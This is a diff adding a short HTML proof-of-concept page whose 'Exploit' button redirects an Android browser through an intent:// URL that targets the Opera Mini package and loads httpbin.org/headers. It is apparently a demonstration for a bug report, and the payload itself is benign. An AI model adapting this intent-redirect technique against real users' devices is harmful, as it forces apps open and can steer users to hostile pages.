@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="exploit()">Exploit</button>
+
+<script>
+ function exploit() {
+   window.location.href =
+     "intent://httpbin.org/headers" +
+     "#Intent;scheme=https;package=com.opera.mini.native;end;";
+ }
+</script>
+</body>
+</html>
